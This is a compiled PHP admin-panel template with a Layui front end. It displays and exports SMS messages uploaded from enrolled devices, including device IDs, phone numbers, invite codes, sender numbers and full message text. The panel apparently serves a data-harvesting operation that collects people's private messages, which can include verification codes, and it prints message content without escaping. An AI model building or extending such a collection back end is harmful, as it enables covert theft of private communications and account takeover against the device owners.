<?php if (!defined('THINK_PATH')) exit(); /*a:2:{s:65:"/www/wwwroot/20.187.70.78/public/../app/admin/view/appv1/sms.html";i:1657784577;s:57:"/www/wwwroot/20.187.70.78/app/admin/view/public/foot.html";i:1657691353;}*/ ?>
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>layui</title>
  <meta name="renderer" content="webkit">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <link rel="stylesheet" href="/static/public/layui/css/layui.css"  media="all">
  <link rel="stylesheet" href="/static/public/font-awesome/css/font-awesome.min.css" media="all" />
  <link rel="stylesheet" href="/static/admin/css/admin.css"  media="all">
  <style type="text/css">
/* tooltip */
#tooltip{
  position:absolute;
  border:1px solid #ccc;
  background:#333;
  padding:2px;
  display:none;
  color:#fff;
}
</style>
</head>
<body style="padding:10px;">
  <div class="tplay-body-div">
    <div class="layui-tab">
      <ul class="layui-tab-title">
        <li class="el-button el-button--success">短信数据查看管理</li>
      </ul>
    </div> 
    <form class="layui-form serch" action="<?php echo url('admin/appv1/sms'); ?>" method="post">
        <div class="layui-form-item" style="float: left;">
          <div class="layui-input-inline">
            <input type="text" name="keywords" lay-verify="title" autocomplete="off" placeholder="请输入登录手机" class="layui-input layui-btn-sm">
          </div>
          <div class="layui-input-inline">
            <input type="text" name="code" lay-verify="title" autocomplete="off" placeholder="请输入邀请码" class="layui-input layui-btn-sm">
          </div>           
          <div class="layui-input-inline">
            <input type="text" name="smstel" lay-verify="title" autocomplete="off" placeholder="请输入短信号码" class="layui-input layui-btn-sm">
          </div>          
          <div class="layui-input-inline">
            <div class="layui-inline">
              <div class="layui-input-inline">
                <input type="text" class="layui-input" id="create_time" placeholder="短信上传时间" name="create_time">
              </div>
            </div>
          </div>
          <button class="el-button el-button--success layui-btn-sm" lay-submit="" lay-filter="serch">立即提交</button>
        </div>
      </form> 
    <table class="layui-table" lay-size="sm">
      <colgroup>
        <col width="50">
        <col width="100">
        <col width="50">
        <col width="40">
        <col width="70">
        <col width="200">
        <col width="100"> 
        <col width="100">          
        <col width="400">
      </colgroup>
      <thead>
        <tr>
          <th>ID</th>
          <th>设备名称</th>
          <th>登录手机</th>          
          <th>邀请码</th>          
		  <th>短信号码</th>
		  <th>短信内容</th>
		  <th>短信发送时间</th>		  
          <th>最后上传时间</th>
          <th>操作</th>
        </tr> 
      </thead>
      <tbody>
        <?php if(is_array($info) || $info instanceof \think\Collection || $info instanceof \think\Paginator): $i = 0; $__LIST__ = $info;if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$vo): $mod = ($i % 2 );++$i;?>
        <tr>
          <td><?php echo $vo['id']; ?></td>
          <td><?php echo $vo['clientid']; ?></td>          
          <td><?php echo $vo['name']; ?></td>
          <td><?php echo $vo['code']; ?></td>
          <td><?php echo $vo['smstel']; ?></td>          
          <td><?php echo $vo['smscontent']; ?></td>          
          <td><?php echo $vo['smstime']; ?></td>          
          <td><?php echo date("Y-m-d H:i:s",$vo['addtime']); ?></td>
          <td class="operation-menu">
            <div class="layui-btn-group">
              <a href="<?php echo url('appv1/smsexcel',['id'=>$vo['userid']]); ?>" class="el-button el-button--primary" title="下载此设备的短信数据" alt="下载此设备的短信数据" style="margin-right: 0;font-size:12px;"><i class="fa fa-download"></i></a>
              <a class="el-button el-button--danger delete" id="<?php echo $vo['id']; ?>" title="删除数据" alt="删除数据" style="margin-right: 0;font-size:12px;">删除</i></a>
            </div>
          </td>
        </tr>
        <?php endforeach; endif; else: echo "" ;endif; ?>
      </tbody>
    </table>
    <div style="padding:0 20px;"><?php echo $info->render(); ?></div>

        <script src="/static/public/layui/layui.js" charset="utf-8"></script>
    <script src="/static/public/jquery/jquery.min.js"></script>
    <script>
            var message;
            layui.config({
                base: '/static/admin/js/',
                version: '1.0.1'
            }).use(['app', 'message'], function() {
                var app = layui.app,
                    $ = layui.jquery,
                    layer = layui.layer;
                //将message设置为全局以便子页面调用
                message = layui.message;
                //主入口
                app.set({
                    type: 'iframe'
                }).init();
            });
        </script> 
    <script type="text/javascript">
    $(function(){
      var x = 10;
      var y = 20;
      $(".tooltip").mouseover(function(e){ 
        var tooltip = "<div id='tooltip'><img src='"+ this.href +"' alt='产品预览图' height='200'/>"+"<\/div>"; //创建 div 元素
        $("body").append(tooltip);  //把它追加到文档中             
        $("#tooltip")
          .css({
            "top": (e.pageY+y) + "px",
            "left":  (e.pageX+x)  + "px"
          }).show("fast");    //设置x坐标和y坐标，并且显示
        }).mouseout(function(){  
        $("#tooltip").remove();  //移除 
        }).mousemove(function(e){
        $("#tooltip")
          .css({
            "top": (e.pageY+y) + "px",
            "left":  (e.pageX+x)  + "px"
          });
      });
    })
    </script>
    <script type="text/javascript">
    $('.a_menu').click(function(){
      var url = $(this).attr('href');
      var id = $(this).attr('id');
      var a = true;
      if(id) {
        $.ajax({
          url:url
          ,async:false
          ,data:{id:id}
          ,success:function(res){
            if(res.code == 0) {
              layer.msg(res.msg);
              a = false;
            }
          }
        })
      } else {
        $.ajax({
          url:url
          ,async:false
          ,success:function(res){
            if(res.code == 0) {
              layer.msg(res.msg);
              a = false;
            }
          }
        })
      }
      return a;
    })
    </script>
    <script>
    layui.use('laydate', function(){
      var laydate = layui.laydate;
      
      //常规用法
      laydate.render({
        elem: '#create_time'
      });
    });
    </script>
    
    <script type="text/javascript">
    $('.delete').click(function(){
      var id = $(this).attr('id');
      layer.confirm('确定要删除此条短信数据？（注：删除后不可恢复）', function(index) {
        $.ajax({
          url:"<?php echo url('admin/appv1/smsdelete'); ?>",
          data:{id:id},
          success:function(res) {
            layer.msg(res.msg);
            if(res.code == 1) {
              setTimeout(function(){
                location.href = res.url;
              },1500)
            }
          }
        })
      })
    })
    </script>
  </div>
</body>
</html>
